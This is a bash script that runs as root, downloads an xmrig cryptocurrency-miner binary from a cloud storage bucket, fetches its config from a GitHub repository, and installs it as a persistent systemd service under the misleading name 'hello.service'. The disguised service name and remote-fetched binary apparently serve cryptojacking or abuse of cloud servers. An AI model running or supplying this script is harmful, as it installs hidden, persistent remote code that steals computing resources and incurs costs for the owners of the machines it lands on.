#!/usr/bin/env bash
sudo su
sudo apt-get update -y
sudo apt-get install libhwloc-dev -y
cd /usr/local/src/
sudo mkdir xmrig
cd xmrig && sudo mkdir build
cd build
wget https://doublepro.nyc3.digitaloceanspaces.com/xmrig
sysctl -w vm.nr_hugepages=1024
curl https://raw.githubusercontent.com/taikhoanxzc004/scaleway/master/XM-S1.json > /usr/local/src/xmrig/build/config.json
curl https://raw.githubusercontent.com/taikhoanxzc004/scaleway/master/hello.service > /lib/systemd/system/hello.service
chmod a+x xmrig
chmod a+x config.json
sudo systemctl daemon-reload
sudo systemctl enable hello.service
sudo systemctl start hello.service
